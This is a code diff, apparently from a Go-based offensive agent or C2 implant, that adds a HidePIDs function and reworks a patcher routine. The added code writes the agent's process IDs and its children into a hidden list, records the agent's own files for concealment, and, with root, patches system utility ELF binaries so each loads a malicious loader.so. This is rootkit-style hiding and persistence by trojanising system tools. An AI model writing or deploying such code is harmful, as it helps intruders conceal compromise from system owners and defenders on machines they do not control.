@@ -198,40 +198,69 @@ func AddCronJob(job string) error {
 	return cmd.Start()
 }
 
+func HidePIDs() (err error) {
+	// mkdir
+	if !util.IsDirExist("/usr/share/at") {
+		os.MkdirAll("/usr/share/at", 0755)
+	}
+
+	// hide this process and all children
+	pid := os.Getpid()
+	children, err := util.GetChildren(pid)
+	if err != nil {
+		return
+	}
+	pids := fmt.Sprintf("%d", pid)
+
+	// agent PID
+	alive, agent_pid := IsAgentRunningPID()
+	if alive {
+		pids = fmt.Sprintf("%d\n%d", pid, agent_pid)
+	}
+
+	for _, child := range children {
+		pids += fmt.Sprintf("\n%d", child)
+	}
+	err = ioutil.WriteFile(Hidden_PIDs, []byte(pids), 0644)
+	if err != nil {
+		return
+	}
+	log.Printf("Added PIDs to %s: %s", Hidden_PIDs, pids)
+	return
+}
+
 // patch ELF file so it automatically loads and runs loader.so
 func patcher() (err error) {
 	if !HasRoot() {
 		return errors.New("Root required")
 	}
-	so_path, err := prepare_loader_so(0)
+
+	// PIDs
+	err = HidePIDs()
 	if err != nil {
-		return
+		log.Printf("Cannot hide PIDs: %v", err)
 	}
 
-	// create hidden list
-	if !util.IsFileExist(Hidden_PIDs) {
-		// pid+1 is for elvsh process
-		pids := fmt.Sprintf("%d\n%d", os.Getpid(), os.Getpid()+1)
-
-		// mkdir
-		os.MkdirAll("/usr/share/at", 0755)
-
-		// PIDs
-		err = ioutil.WriteFile(Hidden_PIDs, []byte(pids), 0644)
-		if err != nil {
-			log.Printf("Cannot create %s: %v", Hidden_PIDs, err)
-		}
-
-		// files
-		files := fmt.Sprintf("%s", util.FileBaseName(RuntimeConfig.AgentRoot))
-		err = ioutil.WriteFile(Hidden_Files, []byte(files), 0644)
-		if err != nil {
-			log.Printf("Cannot create %s: %v", Hidden_Files, err)
-		}
+	// files
+	files := fmt.Sprintf("%s\n%s\n%s",
+		util.FileBaseName(RuntimeConfig.AgentRoot),
+		util.FileBaseName(Hidden_Files),
+		util.FileBaseName(Hidden_PIDs))
+	err = ioutil.WriteFile(Hidden_Files, []byte(files), 0644)
+	if err != nil {
+		log.Printf("Cannot create %s: %v", Hidden_Files, err)
 	}
 
 	// patch system utilities
 	for _, file := range Patched_List {
+		bak := fmt.Sprintf("%s/%s.bak", RuntimeConfig.AgentRoot, file)
+		if !util.IsFileExist(file) || util.IsFileExist(bak) {
+			continue
+		}
+		so_path, err := prepare_loader_so(0, file)
+		if err != nil {
+			return err
+		}
 		e := AddNeededLib(file, so_path)
 		if e != nil {
 			err = fmt.Errorf("%v; %v", err, e)
